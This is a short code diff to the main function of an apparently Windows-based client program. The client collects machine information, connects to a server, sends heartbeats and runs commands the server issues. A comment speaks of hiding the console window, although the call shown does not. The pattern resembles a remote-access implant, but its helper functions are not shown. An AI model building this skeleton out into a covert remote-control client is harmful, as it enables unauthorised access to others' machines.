@@ -1,14 +1,11 @@
 #include "main_client.h"
 
 int main() {
-	// Hide the console window
-	ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);
+	ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);// Hide the console window
 	getMachineInformation();
 	if (connectToServer() != 0) { return -1; }
 	CreateThread(NULL, 0, sendHeartbeat, NULL, 0, NULL);
 	handleServerCommands();
-	//closesocket(clientSocket);
-	//WSACleanup();
 	return 0;
 }
 
